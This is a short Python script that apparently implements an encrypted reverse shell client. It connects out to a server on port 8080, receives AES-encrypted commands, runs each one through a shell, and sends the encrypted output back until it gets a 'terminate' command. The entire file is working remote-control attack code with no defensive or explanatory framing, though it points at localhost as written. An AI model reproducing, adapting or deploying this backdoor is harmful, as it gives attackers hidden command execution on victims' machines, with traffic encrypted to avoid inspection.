import socket
from subprocess import Popen, PIPE
from Crypto.Cipher import AES

COUNTER = "O"*16
KEY = "O"*32
SERVER_PORT = 8080

def encrypt(message):
    encrypto = AES.new(KEY, AES.MODE_CTR, counter=lambda:COUNTER)
    return encrypto.encrypt(message)

def decrypt(message):
    decrypto = AES.new(KEY, AES.MODE_CTR, counter=lambda:COUNTER)
    return decrypto.decrypt(message)

def connect(server_ip):
    so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    so.connect((server_ip, SERVER_PORT))
    while True:
        command = decrypt(so.recv(1024))
        if 'terminate' in command:
            so.close()
            break
        else:
            CMD = Popen(command, shell=True, stdout=PIPE, stdin=PIPE, stderr=PIPE)
            so.send(encrypt(CMD.stdout.read()))
            so.send(encrypt(CMD.stderr.read()))
def main():
    server_ip = socket.gethostbyname('localhost')
    connect(server_ip)
main()
